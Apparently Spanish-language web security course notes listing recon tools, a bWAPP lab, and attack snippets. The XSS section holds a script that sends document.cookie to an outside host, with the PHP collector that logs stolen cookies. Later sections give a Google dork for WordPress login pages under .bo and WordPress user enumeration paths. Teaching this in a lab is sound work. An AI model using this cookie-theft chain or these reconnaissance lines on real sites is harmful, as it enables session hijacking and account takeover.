## Tema 1 



## Tema 2
Dirbuster
https://dirbuster.com/

FFuF
http://ffuf.me/

DotGit
https://chromewebstore.google.com/detail/dotgit/pampamgoihgcedonnphgehgondkhikel

GitDump
https://github.com/Ebryx/GitDump

MaquinaVirtual
https://drive.google.com/file/d/1L0oapq5ZmXGb1zc8t33w4rlRX-CEybxc/view?usp=drive_link


## Tema 3
http://bwapp.ucb.edu.bo

### XSS
(https://community.owasp.org/attacks/xss/)[https://community.owasp.org/attacks/xss/]

```javascript
<script>
    window.location = "http://192.168.1.1/xss/guardar.php?archivo=nombre&cookie=" + encodeURIComponent(document.cookie);
</script>
```

### Recepcion 
```php
<?php
$nombre_archivo = $_GET['archivo'] . ".txt";

$cookie     = $_GET['cookie'];
$fecha      = date("Y-m-d H:i:s");
$ip_remota  = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$contenido = "Fecha: $fecha\nIP Remota: $ip_remota\nUser Agent: $user_agent\nCookie: $cookie\n\n";
file_put_contents($nombre_archivo, $contenido, FILE_APPEND);
?>
```


### Brute Force Login
https://community.owasp.org/attacks/Brute_force_attack
https://community.owasp.org/attacks/Password_Spraying_Attack

https://github.com/portswigger/turbo-intruder
https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988

https://docs.google.com/spreadsheets/d/1vNRxu5bqLMRaOte6p8DjsfJqL9ofLA0oChqF--RjDcU/edit?usp=sharing


### Doork
site:bo inurl:wp-login.php

### Worpress reconocimiento
/?author=1
/wp-json/wp/v2/users
